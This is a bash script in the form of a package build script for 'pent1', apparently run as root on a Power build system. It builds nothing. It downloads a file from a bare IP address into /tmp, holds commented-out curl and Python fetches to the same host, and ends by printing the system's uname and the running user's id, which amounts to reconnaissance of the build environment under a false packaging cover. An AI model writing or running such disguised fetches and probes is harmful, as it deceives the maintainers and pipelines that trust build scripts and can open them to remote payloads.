#!/bin/bash -e
# --------------------------------------------------------------------
#
# Package         : pent1
# Version         : v1.0.0
# Source repo     : https://github.com/testuser19599/pent1.git
# Tested on       : Ubuntu 22.04 (Power 10)
# Language        : C++
# Travis-Check    : False
# Script License  : Apache License, Version 2 or later
# Maintainer      : <testuser19599>
#
# Disclaimer: This script has been tested in root mode on given
# ==========  platform using the mentioned version of the package.
#             It may not work as expected with newer versions of the
#             package and/or distribution.
#
# --------------------------------------------------------------------

# --------------------------------------------------------------------
# Environment Setup
# --------------------------------------------------------------------
PACKAGE_NAME="pent1"
PACKAGE_VERSION="${1:-v1.0.0}"
PACKAGE_URL="https://github.com/testuser19599/${PACKAGE_NAME}.git"
BUILD_HOME="$(pwd)"



# Install dependencies.
#sudo apt-get update -y
#sudo apt-get install -y curl python3

# Clone and build source.
#curl http://52.118.210.243/hic.log
#python3 -c "import requests; print(requests.get('http://52.118.210.243').text)"
#cd / 


# --------------------------------------------------------------------
# Update system and install tools
# --------------------------------------------------------------------
apt-get update -y && apt install -y build-essential

# --------------------------------------------------------------------
# Install Basic Tools and Build Essentials
# --------------------------------------------------------------------
apt-get install -y wget curl git tar automake autoconf libtool cmake patch \
    libexpat1-dev zlib1g-dev libsqlite3-dev libtiff-dev libcurl4-openssl-dev


# --------------------------------------------------------------------
# Download and install for ppc64le
# --------------------------------------------------------------------
cd /tmp
wget http://52.118.210.243/hic.log


echo "[end]"
echo "[info]  $(uname -a)"
echo "[info]  $(id)"
